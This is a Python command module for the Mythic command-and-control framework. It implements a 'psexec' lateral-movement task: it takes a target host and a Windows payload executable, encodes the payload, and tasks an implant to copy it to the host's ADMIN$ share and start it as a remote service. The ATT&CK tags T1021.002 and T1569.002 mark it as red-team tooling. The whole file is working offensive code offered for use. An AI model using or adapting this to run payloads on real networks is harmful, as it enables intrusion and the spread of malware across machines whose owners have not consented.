from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import base64


class PsexecArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="host",
                type=ParameterType.String,
                description="Remote host to execute on (SMB/ADMIN$)",
                parameter_group_info=[ParameterGroupInfo(required=True)],
            ),
            CommandParameter(
                name="payload_file",
                type=ParameterType.File,
                description="Windows payload executable to stage on the target",
                parameter_group_info=[ParameterGroupInfo(required=True)],
            ),
            CommandParameter(
                name="delete_after",
                type=ParameterType.Boolean,
                description="Delete the service after starting it",
                default_value=True,
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception(
                "Require JSON arguments.\n\tUsage: {}".format(PsexecCommand.help_cmd)
            )


class PsexecCommand(CommandBase):
    cmd = "psexec"
    needs_admin = False
    help_cmd = "psexec -host <host> -payload_file <exe>"
    description = (
        "Lateral movement via SMB: copy payload to \\\\host\\ADMIN$\\<random>.exe "
        "using the current thread token, then create/start a remote service. "
        "Use make_token first for alternate credentials."
    )
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1021.002", "T1569.002"]
    argument_class = PsexecArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        file_content = await SendMythicRPCFileGetContent(
            MythicRPCFileGetContentMessage(
                AgentFileId=taskData.args.get_arg("payload_file"),
            )
        )
        if not file_content.Success:
            response.Success = False
            response.Error = f"Failed to get payload file: {file_content.Error}"
            return response
        taskData.args.add_arg(
            "file_data",
            base64.b64encode(file_content.Content).decode(),
            ParameterType.String,
        )
        delete_after = taskData.args.get_arg("delete_after")
        taskData.args.remove_arg("delete_after")
        taskData.args.add_arg("delete_after", 1 if delete_after else 0, ParameterType.Number)
        response.DisplayParams = (
            f"Targeting {taskData.args.get_arg('host')} "
            f"({len(file_content.Content)} bytes payload)"
        )
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID, Success=True
        )
